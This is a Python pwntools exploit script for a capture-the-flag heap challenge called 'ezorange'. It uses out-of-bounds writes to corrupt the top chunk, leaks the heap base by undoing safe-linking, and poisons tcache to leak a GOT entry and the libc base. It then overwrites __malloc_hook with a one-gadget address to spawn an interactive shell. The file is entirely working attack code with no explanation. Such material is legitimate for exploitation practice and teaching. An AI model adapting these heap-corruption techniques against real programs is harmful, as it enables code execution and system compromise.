#!/usr/bin/python3

from pwn import *

exe = ELF("./ezorange_patched")
libc = ELF("./libc.so.6")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b *0x0000000000401485
        c
        ''')
        input()

def create(num, size):
    sla(b'> ', b'1')
    slna(b'number: ', num)
    slna(b'Size: ', size)

def modify(num, idx, new):
    sla(b'> ', b'2')
    slna(b'number: ', num)
    slna(b'index: ', idx)
    sla(b'New value: ', new)

if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

create(0, 0xd00)
modify(0, 3336, b'97')
modify(0, 3337, b'00')
modify(0, 3338, b'00')
create(1, 0xf90)
modify(1, 3992, b'97')
modify(1, 3993, b'00')
modify(1, 3994, b'00')
create(1, 0x100)

x = []
for i in range(8):
    sla(b'> ', b'2')
    slna(b'number: ', 0)
    slna(b'index: ', 3344 + i)
    p.recvuntil(b'Current value: ')
    x.append(int(p.recvline()[:-1]))
    print(x)
    sla(b'New value: ', b'0')
print(x)
b = bytes(x)
fd_encrypted = u64(b)
log.info("fd_encrypted : " + hex(fd_encrypted))
heap_base = fd_encrypted << 12
log.info("heap_base : " + hex(heap_base))

# 138512
for i in range(8):
    modify(0, 138512 + i, f'{((exe.got.alarm ^ ((heap_base + 0x21fb0) >> 12)) >> (8 * i)) & 0xff}'.encode())

create(1, 0x30)
create(1, 0x30)
y = []
for i in range(8):
    sla(b'> ', b'2')
    slna(b'number: ', 1)
    slna(b'index: ', i)
    p.recvuntil(b'Current value: ')
    y.append(int(p.recvline()[:-1]))
    print(y)
    sla(b'New value: ', f'{y[i]}')
print(y)
c = bytes(y)
got_alarm = u64(c)
log.info("got.alarm : " + hex(got_alarm))
libc.address = got_alarm - 0xce010
log.info("libc_base : " + hex(libc.address))

create(1, 3000)
modify(0, 277049, b'3')
modify(0, 277050, b'0')
create(1, 0xcc8)
modify(0, 416313, b'3')
modify(0, 416314, b'0')
create(1, 1000)

for i in range(8):
    modify(0, 416320 + i, f'{((libc.sym.__malloc_hook ^ ((heap_base + 0x65ce0) >> 12)) >> (8 * i)) & 0xff}'.encode())

create(1, 0x300)
create(1, 0x300)

for i in range(8):
    modify(1, i, f'{(libc.address + 0xceb71) >> (8 * i) & 0xff}'.encode())
create(1, 0x1000)
    







p.interactive()
